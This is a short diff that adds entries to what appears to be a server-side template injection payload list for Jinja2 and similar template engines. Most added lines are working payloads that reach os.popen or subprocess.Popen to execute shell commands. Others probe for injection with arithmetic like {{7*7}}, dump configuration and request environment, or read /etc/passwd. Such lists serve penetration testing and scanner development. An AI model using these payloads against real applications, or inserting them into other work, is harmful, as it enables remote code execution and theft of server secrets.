@@ -41,3 +41,18 @@ ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()
 {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
 {{joiner.__init__.__globals__.os.popen('id').read()}}
 {{namespace.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "Popen" in x.__name__ %}{{x('id',shell=True,stdout=-1).communicate()[0]}}{% endif %}{% endfor %}
+${7*7}
+*{7*7}
+#{7*7}
+@(7*7)
+{{7*7}}
+{{config.items()}}
+{{request.environ}}
+{{self.__init__.__globals__}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{get_flashed_messages.__globals__['__builtins__'].__import__('os').popen('id').read()}}
